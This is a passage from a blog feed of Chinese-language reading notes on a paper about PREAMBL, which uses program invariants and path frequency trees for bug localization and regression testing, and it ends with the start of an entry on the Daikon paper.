style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">))</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>F</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msub><mi>F</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>S</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>−</mo><mi>C</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Incrase(p) = F_e(p)/(F_e(p)+S_e(p)) - Context(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.02778em;">cr</span><span class="mord mathnormal">a</span><span class="mord mathnormal">se</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>m</mi><mi>p</mi><mi>o</mi><mi>r</mi><mi>t</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>2</mn><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>I</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mi>p</mi></mrow></mfrac><mo>+</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>S</mi><mi>e</mi><mi>n</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>v</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Importance(p) = \frac{2}{1/Increase()p} + 1/Sensitivity(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">t</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.3651em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1/</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">cre</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">se</span><span class="mopen mtight">(</span><span class="mclose mtight">)</span><span class="mord mathnormal mtight">p</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq></li></ul></li><li>PREAMBL 的目标是辨识出对bug敏感的路径。如，该路径与多个失败的运行相关。<ul><li>然而，我们还希望具有特异性，即在许多成功运行中，没有被预测失败的路径</li><li>在信息检索中，结合specificity和sensitivity的标准方法是计算它们的谐波平均，因为这种度量优先考虑两个维度中的高分。度量指标 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>m</mi><mi>p</mi><mi>o</mi><mi>r</mi><mi>t</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Importance(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">t</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 正好达到了这个目的</li></ul></li></ul><h4 id="a.-building-the-path-frequency-tree" tabindex="-1">A. building the Path Frequency Tree</h4><ul><li>PREAMBL为有效计算 variable-length paths,需快速决定 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>e</mi></msub><mo separator="true">,</mo><msub><mi>F</mi><mi>e</mi></msub><mo separator="true">,</mo><msub><mi>S</mi><mi>o</mi></msub><mo separator="true">,</mo><msub><mi>F</mi><mi>o</mi></msub></mrow><annotation encoding="application/x-tex">S_e,F_e,S_o,F_o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 的值，谓词，其使用 path frequency tree 为每个观测到的谓语。<ul><li>每个路径频率树 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><msub><mi>p</mi><mi>i</mi></msub></msub></mrow><annotation encoding="application/x-tex">T_{p_{i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq> 是一个数据结构，其保存了以某个谓词 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 开头的路径在失败运行 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F_e(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 和 成功运行 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_e(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 中被执行的次数。</li><li>路径频率树中的每个节点表示程序路径中单个谓词 (pk = vk) 的值。</li><li>节点的父节点是路径中紧接在节点之前的谓词值。 每个子节点代表当前节点后续直接执行的谓词值</li></ul></li><li>当我们从跟踪文件数据中读取每个执行路径时，我们在给定路径的树上遍历时在每个节点上递增 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_e(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F_e(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 的值。<ul><li>此外，我们根据执行成功或失败递增了树级别的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_o(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F_o(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 的值。</li></ul></li><li>查找路径(px = vx) ⇒ (py = vy) ⇒ … ⇒ (pz = vz)的这些值，PREAMBL首先会找到px的路径频率树。<ul><li>然后，我们从根节点px = vx的子节点开始遍历树，直到到达对应于pz = vz的节点为止。</li><li>此节点上存储的Se§和Fe§值将指示路径在成功和失败运行中分别执行的次数。我们可以使用这些值以及存储在根节点处的So§和Fo§来计算路径的Increase、Sensitivity和Importance。</li></ul></li><li>生成路径频率树的计算复杂度为O(n × l^2)，其中n是捕获的路径数，l是这些路径的最大长度。在实践中，PREAMBL分析所有测试应用程序所需的时间不到一分钟。<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_4.png" alt></li></ul><h4 id="b.-generating-high-importance-sub-paths" tabindex="-1">B. Generating High-importance Sub-paths</h4><ul><li>建立好频率树后，我们遍历树寻找最大Importance路径</li><li>具体来说<ul><li>对于每个节点，我们计算Increase§。对于Increase &lt; 0的路径相应的节点，我们立即丢弃。</li><li>其他的则被添加到一个优先级队列中，该队列按照它们的Importance分数进行排序。</li><li>这个过程持续进行，直到所有路径频率树都被完全分析。</li><li>在这一点上，可以从优先级队列中查询出前几个结果。</li><li>这个过程的最坏时间复杂度是O(n log(n))，其中n是捕获的不同路径数。</li></ul></li></ul><h4 id="c.-mapping-bugs-to-invariants" tabindex="-1">C. Mapping Bugs to Invariants</h4><ul><li>高分的路径可以告诉程序员可能出现bug的路径，但也不一定有。</li><li>因此，PREAMBL将此错误定位信息联系到不变量。这些不变量将总结出希望的输出行为，这将允许用户比起重看代码更容易的理解代码在做什么</li><li>此外，由于生成的不变式是路径特定的，因此只显示与失败路径相关的特定不变式。如果不变式捕获了不良行为，那么以不变式的形式对行为进行总结可能会使开发人员更容易识别实现中的问题。</li></ul><h4 id="d.-case-study" tabindex="-1">D. Case Study</h4><ul><li>现在假设图4中错误已被修复，现在存在一个新函数，如下图，handle_input()将一个长整数，而不是一个整数传递给要转换的值。然而当值足够大的时候，long转int会移除，产生错误，接下来我们将展示如何使用PREAMBL来定位这个错误<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_5.png" alt></li><li>当运行PREAMBL时，首先构建以可路径树，该村了成功和失败执行中每个执行路径的频率。如下图示，此时与错误高度相关的路径是(p2 = 1) ⇒ (p0 = 1) ⇒ (p1 = 0)，这准确匹配了bug在convert_units从if语句p2中调用并执行有效的非溢出转换时出现的观察结果<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_6.png" alt></li><li>在这个例子中，为convert_units()生成的不变量是(p0 = 1 ∧ p1 = 0) ⇒ (result == 36 × result)。由于这个不变量描述了bug路径上result的行为，其与bug关联在一起呈现给开发人员。<ul><li>因此，PREAMBL向开发人员展示了bug的本地化路径和相应的预期行为。</li><li>此时，她可能会立即注意到传递给convert_units的长整数和使用的整数类型之间的类型不匹配。</li></ul></li></ul><h3 id="5-%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C" tabindex="-1">5 实验结果</h3><ul><li>为评估PREAMBL有效性，我们SIR[15]上进行了测试</li><li>我们使用SIR作为应用程序和bug的标准化存储库，以便与先前的bug检测工具进行比较[10]，[9]。</li></ul><h4 id="a.-invariant-quality" tabindex="-1">A. Invariant Quality</h4><ul><li>为检查PRECIS生成的应用程序的不变量的质量，我们对每个应用程序运行了测试套件的三分之一，生成了跟踪数据，并执行了谓词聚类导出不变量。</li><li>结果显示：生成的不变量数量与程序大小成比例增长，但即使对于大小相似的程序，变化也很大。我们发现这与每个程序的结构有关。<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_7.png" alt><ul><li>例如，sed.c这样大量使用全局变量的程序往往生成的不变量数量极高，因为函数输出的数量较多</li></ul></li><li>我们将不变量的控制流图CFG覆盖率定义为 不变量触发的程序路径百分比<ul><li>覆盖率在应用程序间差异很大，对于控制流导向型程序，其中数据流主要通过线性运算符描述，覆盖率最高。</li><li>还检查了不变量的虚假程度，具体来说，我们将不变量的假阳性率定义为PRECIS生成的不变量在一个测试集的三分之一上失效的百分比，而在运行完整的测试集时无效。PRECIS生成的不变量具有很低的假阳性率：在所有情况下都不到10%。</li></ul></li></ul><h4 id="b.-regression-testing" tabindex="-1">B. Regression Testing</h4><ul><li>我们使用每个应用程序buggy版本来回归测试<ul><li>第一步是生成正确版本的不变量</li><li>然后对于每个buggy版本，映射不变量 谓语，输入和输出</li></ul></li><li>为了评估不变量在检测回归方面的有效性，我们运行测试套件同时检查生成的不变量。如果在测试运行期间任何不变量求值为假，则我们已经检测到了回归。<ul><li>对于不同的程序，检测覆盖率差异很大，如果程序控制流发生显著变化，检测覆盖率明显下降</li><li>此外，如果不变量是对指针密集算术的程序生成的，你们不变量将生成在指针的第一个元素上，如果对指针的第二个元素或其他元素进行更改，则检测覆盖率会降低。原则上，可以为所有指针元素生成不变量，但这将导致不变量生成的高开销。</li></ul></li></ul><h4 id="c.-bug-localization" tabindex="-1">C. Bug Localization</h4><ul><li>我们评估了PREAMBL使用的基于路径的定位计数的有效性，并测量了可以与不变量信息相关联的局部化错误百分比。为此，我们测量了这些错误中有多小可以定位到特定的子路径，并提供了关于这些子路径特异性的综合信息。</li><li>具体而言，我们将PREAMBL与先前提出的分析方案进行分析：[9]中使用的固定长度的函数内路径和[11]中使用的简单的单分支分析方案。所有三种技术都通过前5个导出路径的平均重要性得分进行评分。</li><li>表IV显示了几个基准测试的汇总结果。在每种情况下，PREAMBL生成了更高分数的结果。直觉上，按照重要性§度量的定义，路径的更高分数意味着路径对错误的更好预测，因此更好的错误定位，这反过来又意味着开发人员的调试开销更少。与HOLMES和CBI相比，PREAMBL生成的路径的更高分数表明了改进的错误定位。<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_8.png" alt></li></ul><h3 id="6-%E7%BB%93%E8%AE%BA" tabindex="-1">6 结论</h3><ul><li>我们提出了一种通过使用程序不变量将错误定位和回归测试结合起来的技术。</li><li>我们建议将程序调试从发布前和发布后的阶段分开，提出了一种流程，在这些阶段中产生的调试信息可以一起使用，以提高软件的可靠性。</li></ul><h2 id="%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93" tabindex="-1">个人总结</h2><ul><li>本文延续它们之前的工作[1],一个动态不变量探测方法，再次扩展，随后提出了PREAMBL，一个使用不变量进行回归测试和错误定位的方法<ul><li>在回归测试中，使用不变量的失败作为回归的标志，需要进行不变量的映射（有时需要程序员的介入）</li><li>在错误定位中，使用路径频率树来统计路径的执行次数，通过计算路径的重要性来定位错误，随后将错误与不变量联系起来，以便开发人员更好的理解错误</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Daikon论文</title>
      <link href="/2024/03/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/daikon%E8%AE%BA%E6%96%87/"/>
      <url>/2024/03/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/daikon%E8%AE%BA%E6%96%87/</url>
      
